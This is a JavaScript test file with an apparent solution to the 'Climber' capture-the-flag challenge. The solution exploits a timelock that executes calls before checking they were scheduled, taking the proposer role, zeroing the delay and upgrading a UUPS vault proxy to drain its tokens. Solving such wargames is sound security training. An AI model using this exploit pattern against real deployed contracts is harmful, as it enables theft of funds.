const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');

        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Deploy timelock attack contract
        let attackTimelock = await (
            await ethers.getContractFactory('AttackTimelock', player)
        ).deploy(timelock.address);

        // Encode functions to be run by the executor
        const abi = [
            "function grantRole(bytes32 role, address account)",
            "function updateDelay(uint64 newDelay)",
            "function takeover(bytes32 salt)",
            "function upgradeTo(address newImplementation)",
        ];
        const iface = new ethers.utils.Interface(abi);
        const salt = '0x0000000000000000000000000000000000000000000000000000000000000000';
        const PROPOSER_ROLE = '0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1';

        const grantRoleCall = iface.encodeFunctionData('grantRole', [PROPOSER_ROLE, attackTimelock.address]);
        const updateDelayCall = iface.encodeFunctionData('updateDelay', [0]);
        const takeoverCall = iface.encodeFunctionData('takeover', [salt]);

        // Execute function sequence
        await timelock.connect(player).execute(
            [timelock.address, timelock.address, attackTimelock.address],
            [0, 0, 0],
            [grantRoleCall, updateDelayCall, takeoverCall],
            salt);

        // At the end of the execution we expect the attackTimelock to be...
        // the proposer for operations on the timelock contract.
        expect(await timelock.hasRole(PROPOSER_ROLE, attackTimelock.address)).to.be.true;

        // Deploy AttackClimber and upgrade ClimberValut to it...
        let attack = await (await ethers.getContractFactory('AttackClimber', player)).deploy();

        let implAddr = await ethers.provider.getStorageAt(vault.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
        console.log("Implement1:   ", implAddr);

        const upgradeToCall = iface.encodeFunctionData('upgradeTo', [attack.address]);
        let tx = await attackTimelock.connect(player).schedule([vault.address], [0], [upgradeToCall], salt);
        tx.wait();

        tx = await timelock.connect(player).execute([vault.address], [0], [upgradeToCall], salt);
        tx.wait();

        let implAddr2 = await ethers.provider.getStorageAt(vault.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
        console.log("Implement2:    ", implAddr2);
        console.log("AttackClimber: ", attack.address);

        // Transfer all tokens to player...
        let weakVault = await (
            await ethers.getContractFactory('AttackClimber', deployer)
        ).attach(vault.address);

        await weakVault.connect(player).transferAll(token.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
